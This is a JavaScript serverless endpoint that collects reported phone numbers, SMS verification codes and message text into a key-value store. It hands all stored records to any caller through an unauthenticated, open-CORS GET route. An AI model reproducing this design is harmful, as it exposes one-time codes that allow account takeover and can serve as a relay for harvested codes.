import { kv } from '@vercel/kv';

const REPORT_KEY = 'sms:reports';
const MAX_REPORTS = 1000;

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // POST: 用户端上报
  if (req.method === 'POST') {
    try {
      const { phone, code, content, time, oid } = req.body || {};
      if (!phone || !code) {
        return res.status(400).json({ error: 'phone 和 code 不能为空' });
      }

      // 30 秒内相同 phone+code 去重，避免轮询重复写入
      const recent = await kv.lrange(REPORT_KEY, 0, 29);
      const now = Date.now();
      const dup = recent.some(r => {
        try {
          const o = typeof r === 'string' ? JSON.parse(r) : r;
          return o.phone === String(phone) &&
                 o.code === String(code) &&
                 now - (o.ts || 0) < 30000;
        } catch (e) { return false; }
      });
      if (dup) return res.status(200).json({ success: true, dup: true });

      const record = {
        phone: String(phone),
        code: String(code),
        content: String(content || ''),
        time: time || new Date().toLocaleString('zh-CN', { hour12: false }),
        oid: oid || '',
        ts: now
      };

      await kv.lpush(REPORT_KEY, JSON.stringify(record));
      await kv.ltrim(REPORT_KEY, 0, MAX_REPORTS - 1);

      return res.status(200).json({ success: true });
    } catch (err) {
      return res.status(500).json({ error: '上报失败: ' + err.message });
    }
  }

  // GET: admin 拉取记录
  if (req.method === 'GET') {
    try {
      const { limit } = req.query;
      const n = Math.min(parseInt(limit) || 500, MAX_REPORTS);
      const raw = await kv.lrange(REPORT_KEY, 0, n - 1);
      const list = raw.map(r => {
        try { return typeof r === 'string' ? JSON.parse(r) : r; } catch (e) { return null; }
      }).filter(Boolean);
      return res.status(200).json(list);
    } catch (err) {
      return res.status(500).json({ error: '查询失败: ' + err.message });
    }
  }

  return res.status(405).json({ error: 'Method Not Allowed' });
}
